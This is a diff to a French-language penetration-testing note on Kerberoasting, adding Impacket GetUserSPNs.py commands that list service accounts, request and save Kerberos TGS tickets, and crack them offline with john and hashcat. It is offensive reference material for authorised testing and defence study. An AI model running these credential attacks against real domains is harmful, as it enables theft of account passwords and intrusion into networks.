@@ -38,8 +38,22 @@ hashcat -m 13100 --force -a 0 hash.txt dict.txt
 - Obtention des Hashs
 
 ```
-./GetUserSPNs.py -request -dc-ip 192.168.1.105 ignite.local/yashika
+# Liste des comptes disposant d'un SPN
+GetUserSPNs.py -dc-ip $TARGET_IP $AD_DOMAIN/$AD_USER:$AD_PASSWORD
+
+# Récupération des TGS
+GetUserSPNs.py -dc-ip $TARGET_IP $AD_DOMAIN/$AD_USER:$AD_PASSWORD -request
+
+# Récupération d'un unique TGS
+GetUserSPNs.py -dc-ip $TARGET_IP $AD_DOMAIN/$AD_USER:$AD_PASSWORD -request-user interesting.user
+
+# Enregistrement des TGS pour les fournier à john / hashcat (fichier 'hashes.txt')
+GetUserSPNs.py -dc-ip $TARGET_IP $AD_DOMAIN/$AD_USER:$AD_PASSWORD -request -outputfile hashes.txt
 ```
 
 ##### Cracker les hash (bruteforce)
-john --wordlist=/path/to/rockyou.txt hashes
+
+```
+john --wordlist=/path/to/rockyou.txt hashes.txt
+```
+[[_Techniques/Mots de passe/Casser un mot de passe/Hashcat]]
